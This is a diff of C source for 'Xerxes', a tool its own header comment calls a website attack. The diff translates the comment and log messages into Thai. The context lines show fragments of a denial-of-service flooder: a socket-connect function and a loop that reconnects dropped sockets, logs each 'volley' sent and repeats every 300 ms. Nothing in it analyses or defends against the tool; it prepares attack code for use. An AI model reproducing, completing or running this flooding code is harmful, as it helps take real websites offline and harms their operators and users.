@@ -1,4 +1,4 @@
-/* Xerxes - website attack  */
+/* Xerxes - ยิงเว็บไซต์ */
      
     #include <stdio.h>
     #include <stdlib.h>
@@ -15,7 +15,7 @@
     int make_socket(char *host, char *port) {
             struct addrinfo hints, *servinfo, *p;
             int sock, r;
-    //      fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+    //      fprintf(stderr, "[กำลังเชื่อมต่อ -> %s:%s\n", host, port);
             memset(&hints, 0, sizeof(hints));
             hints.ai_family = AF_UNSPEC;
             hints.ai_socktype = SOCK_STREAM;
@@ -36,12 +36,12 @@
             if(p == NULL) {
                     if(servinfo)
                             freeaddrinfo(servinfo);
-                    fprintf(stderr, "No connection could be made\n");
+                    fprintf(stderr, "ไม่สามารถเชื่อมต่อได้\n");
                     exit(0);
             }
             if(servinfo)
                     freeaddrinfo(servinfo);
-            fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+            fprintf(stderr, "[เชื่อมต่อแล้ว -> %s:%s]\n", host, port);
             return sock;
     }
      
@@ -68,9 +68,9 @@
                                     sockets[x] = make_socket(host, port);
                             } else
     //                              fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-                            fprintf(stderr, "[%i: Voly Sent]\n", id);
+                            fprintf(stderr, "[%i: ส่ง Voly]\n", id);
                     }
-                    fprintf(stderr, "[%i: Voly Sent]\n", id);
+                    fprintf(stderr, "[%i: ส่ง Voly]\n", id);
                     usleep(300000);
             }
     }
